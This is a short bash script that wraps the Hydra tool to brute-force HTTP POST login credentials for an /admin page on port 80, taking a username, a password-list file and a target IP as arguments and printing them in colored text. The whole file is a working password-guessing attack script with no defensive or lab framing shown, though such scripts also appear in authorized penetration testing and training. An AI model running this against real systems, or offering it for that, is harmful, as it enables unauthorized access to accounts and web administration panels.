#!/bin/bash

user=$1
file=$2
ip=$3

echo "Using Hydra to get HTTP credentials"
echo "..."

green='\033[0;32m'
clear='\033[0m'

echo -e "${green}User: ${user}, Passwd File: ${file}, IP: ${ip} ${clear}"
hydra -l "$user" -P "$file" http-post://"${ip}":80/admin
